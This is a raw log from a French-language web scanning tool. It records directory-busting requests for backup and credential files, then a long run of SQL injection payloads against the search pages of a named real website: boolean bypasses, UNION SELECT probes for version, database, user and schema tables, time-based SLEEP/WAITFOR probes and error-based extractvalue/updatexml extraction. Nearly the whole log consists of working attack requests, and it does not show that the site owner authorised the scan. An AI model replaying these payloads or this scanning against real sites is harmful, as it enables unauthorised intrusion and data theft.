2025-09-22 17:56:14 | [32mINFO[0m | cybersec_tool.sql_scanner | [32m🔍 Début du scan d'injection SQL[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.backup -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.xml -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.sql -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.db -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.sqlite -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/auth.orig -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/auth.tmp -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/auth.md -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.tmp -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/auth.log -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.ini -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/auth.xml -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/auth.db -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.old -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/auth.conf -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.log -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.sqlite -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.ini -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.txt -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.db -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.old -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.tmp -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/authentication.md -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.backup -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.orig -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.sql -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.conf -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.conf -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.md -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.tmp -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.old -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.orig -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.backup -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.txt -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.config -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.bak -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.bak -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.xml -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backup.log -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.conf -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.tmp -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.db -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.config -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.bak -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.backup -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.md -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.orig -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.log -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.sql -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.ini -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.log -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.sqlite -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.config -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.xml -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.db -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.sqlite -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.old -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.xml -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.ini -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.txt -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/backups.sql -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.txt -> 404[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/bak.md -> 404[0m
2026-01-18 00:48:35 | [32mINFO[0m | cybersec_tool.directory_buster | [32m✅ Découverte terminée en 3.42s - 20 éléments trouvés[0m
2026-01-18 00:48:35 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:36 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:36 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:37 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:37 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:38 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:38 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:39 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:39 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:39 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:40 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:41 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:41 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:41 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:42 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:48:42 | [32mINFO[0m | cybersec_tool.report_generator | [32m📄 Rapport HTML généré: reports/scans/cybersec_report_20260118_004842.html[0m
2026-01-18 00:49:31 | [32mINFO[0m | cybersec_tool.report_generator | [32m📄 Rapport d'exécution HTML généré: reports\executions\cybersec_exec_20260118_004931.html[0m
2026-01-18 00:53:25 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:53:25 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:53:25 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:53:26 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:53:26 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:53:27 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 00:53:27 | [32mINFO[0m | cybersec_tool.report_generator | [32m📄 Rapport HTML généré: reports/scans/cybersec_report_20260118_005327.html[0m
2026-01-18 01:00:39 | [32mINFO[0m | cybersec_tool.sql_scanner | [32m🔍 Début du scan d'injection SQL[0m
2026-01-18 01:00:39 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 01:00:40 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/ -> 200[0m
2026-01-18 01:00:40 | [32mINFO[0m | cybersec_tool.sql_scanner | [32m📊 Trouvé 0 paramètres GET et 2 formulaires[0m
2026-01-18 01:00:40 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+OR+1%3D1-- -> 200[0m
2026-01-18 01:00:41 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+OR+1%3D1%23 -> 200[0m
2026-01-18 01:00:41 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+OR+%27a%27%3D%27a -> 200[0m
2026-01-18 01:00:42 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+OR+%271%27%3D%271%27+--+- -> 200[0m
2026-01-18 01:00:42 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=admin%27-- -> 200[0m
2026-01-18 01:00:43 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27%29%29+OR+%271%27%3D%271%27+--+- -> 200[0m
2026-01-18 01:00:43 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27%29+OR+%28%271%27%3D%271 -> 200[0m
2026-01-18 01:00:44 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%22+OR+%221%22%3D%221%22+--+ -> 200[0m
2026-01-18 01:00:44 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27%29+OR+1%3D1+--+ -> 200[0m
2026-01-18 01:00:45 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=1+OR+1%3D1 -> 200[0m
2026-01-18 01:00:45 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=1%27+OR+%271%27%3D%271%27+--+ -> 200[0m
2026-01-18 01:00:46 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+NULL-- -> 200[0m
2026-01-18 01:00:46 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+NULL%2CNULL-- -> 200[0m
2026-01-18 01:00:47 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+OR+SLEEP%281%29-- -> 200[0m
2026-01-18 01:00:47 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27%3BWAITFOR+DELAY+%270%3A0%3A1%27-- -> 200[0m
2026-01-18 01:00:48 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+AND+%271%27%3D%271%27+--+ -> 200[0m
2026-01-18 01:00:48 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+AND+%271%27%3E%270%27+--+ -> 200[0m
2026-01-18 01:00:49 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27%29+AND+%281%3D1%29+--+ -> 200[0m
2026-01-18 01:00:49 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=0+OR+1%3D1 -> 200[0m
2026-01-18 01:00:50 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=0%29+OR+1%3D1+--+ -> 200[0m
2026-01-18 01:00:50 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+OR+1%3D1%2F%2A -> 200[0m
2026-01-18 01:00:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27%29+OR+1%3D1%2F%2A -> 200[0m
2026-01-18 01:00:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+1%2C2-- -> 200[0m
2026-01-18 01:00:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+OR+%271%27%3D%271%27+%2F%2A -> 200[0m
2026-01-18 01:00:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+OR+1%3D1+LIMIT+1+-- -> 200[0m
2026-01-18 01:00:53 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27%29+OR+1%3D1+--+- -> 200[0m
2026-01-18 01:00:53 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=1+OR+1%3D1+--+- -> 200[0m
2026-01-18 01:00:54 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+OR+SLEEP%283%29-- -> 200[0m
2026-01-18 01:00:54 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=1%3B+SELECT+version%28%29%3B+-- -> 200[0m
2026-01-18 01:00:55 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+NULL%2CNULL%2CNULL-- -> 200[0m
2026-01-18 01:00:55 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+AND+SLEEP%283%29--+ -> 200[0m
2026-01-18 01:00:56 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+%40%40version--+ -> 200[0m
2026-01-18 01:00:56 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+database%28%29--+ -> 200[0m
2026-01-18 01:00:57 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+user%28%29--+ -> 200[0m
2026-01-18 01:00:57 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+AND+extractvalue%281%2C+concat%280x7e%2Cversion%28%29%29%29--+ -> 200[0m
2026-01-18 01:00:58 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%22+AND+updatexml%281%2C+concat%280x7e%2C+user%28%29%29%2C+1%29--+ -> 200[0m
2026-01-18 01:00:58 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+version%28%29--+ -> 200[0m
2026-01-18 01:00:59 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+current_database%28%29--+ -> 200[0m
2026-01-18 01:00:59 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27%3BWAITFOR+DELAY+%270%3A0%3A2%27-- -> 200[0m
2026-01-18 01:01:00 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+banner+FROM+v%24version--+ -> 200[0m
2026-01-18 01:01:00 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+table_name+FROM+information_schema.tables+LIMIT+1--+ -> 200[0m
2026-01-18 01:01:01 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+UNION+SELECT+column_name+FROM+information_schema.columns+LIMIT+1--+ -> 200[0m
2026-01-18 01:01:01 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/recherche.php?q=%27+AND+extractvalue%281%2C+concat%280x7e%2C%28SELECT+database%28%29%29%29%29--+ -> 200[0m
2026-01-18 01:01:02 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+OR+1%3D1-- -> 200[0m
2026-01-18 01:01:02 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+OR+1%3D1%23 -> 200[0m
2026-01-18 01:01:03 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+OR+%27a%27%3D%27a -> 200[0m
2026-01-18 01:01:03 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+OR+%271%27%3D%271%27+--+- -> 200[0m
2026-01-18 01:01:04 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=admin%27-- -> 200[0m
2026-01-18 01:01:04 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27%29%29+OR+%271%27%3D%271%27+--+- -> 200[0m
2026-01-18 01:01:05 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27%29+OR+%28%271%27%3D%271 -> 200[0m
2026-01-18 01:01:05 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%22+OR+%221%22%3D%221%22+--+ -> 200[0m
2026-01-18 01:01:06 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27%29+OR+1%3D1+--+ -> 200[0m
2026-01-18 01:01:06 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=1+OR+1%3D1 -> 200[0m
2026-01-18 01:01:07 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=1%27+OR+%271%27%3D%271%27+--+ -> 200[0m
2026-01-18 01:01:07 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+NULL-- -> 200[0m
2026-01-18 01:01:08 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+NULL%2CNULL-- -> 200[0m
2026-01-18 01:01:08 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+OR+SLEEP%281%29-- -> 200[0m
2026-01-18 01:01:09 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27%3BWAITFOR+DELAY+%270%3A0%3A1%27-- -> 200[0m
2026-01-18 01:01:09 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+AND+%271%27%3D%271%27+--+ -> 200[0m
2026-01-18 01:01:10 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+AND+%271%27%3E%270%27+--+ -> 200[0m
2026-01-18 01:01:10 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27%29+AND+%281%3D1%29+--+ -> 200[0m
2026-01-18 01:01:11 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=0+OR+1%3D1 -> 200[0m
2026-01-18 01:01:11 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=0%29+OR+1%3D1+--+ -> 200[0m
2026-01-18 01:01:12 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+OR+1%3D1%2F%2A -> 200[0m
2026-01-18 01:01:12 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27%29+OR+1%3D1%2F%2A -> 200[0m
2026-01-18 01:01:13 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+1%2C2-- -> 200[0m
2026-01-18 01:01:13 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+OR+%271%27%3D%271%27+%2F%2A -> 200[0m
2026-01-18 01:01:14 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+OR+1%3D1+LIMIT+1+-- -> 200[0m
2026-01-18 01:01:14 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27%29+OR+1%3D1+--+- -> 200[0m
2026-01-18 01:01:15 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=1+OR+1%3D1+--+- -> 200[0m
2026-01-18 01:01:15 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+OR+SLEEP%283%29-- -> 200[0m
2026-01-18 01:01:16 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=1%3B+SELECT+version%28%29%3B+-- -> 200[0m
2026-01-18 01:01:16 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+NULL%2CNULL%2CNULL-- -> 200[0m
2026-01-18 01:01:17 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+AND+SLEEP%283%29--+ -> 200[0m
2026-01-18 01:01:17 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+%40%40version--+ -> 200[0m
2026-01-18 01:01:18 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+database%28%29--+ -> 200[0m
2026-01-18 01:01:18 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+user%28%29--+ -> 200[0m
2026-01-18 01:01:19 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+AND+extractvalue%281%2C+concat%280x7e%2Cversion%28%29%29%29--+ -> 200[0m
2026-01-18 01:01:19 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%22+AND+updatexml%281%2C+concat%280x7e%2C+user%28%29%29%2C+1%29--+ -> 200[0m
2026-01-18 01:01:20 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+version%28%29--+ -> 200[0m
2026-01-18 01:01:20 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+current_database%28%29--+ -> 200[0m
2026-01-18 01:01:21 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27%3BWAITFOR+DELAY+%270%3A0%3A2%27-- -> 200[0m
2026-01-18 01:01:21 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+banner+FROM+v%24version--+ -> 200[0m
2026-01-18 01:01:22 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.kikourou.net/forum/search.php?keywords=%27+UNION+SELECT+table_name+FROM+information_schema.tables+LIMIT+1--+ -> 200[0m
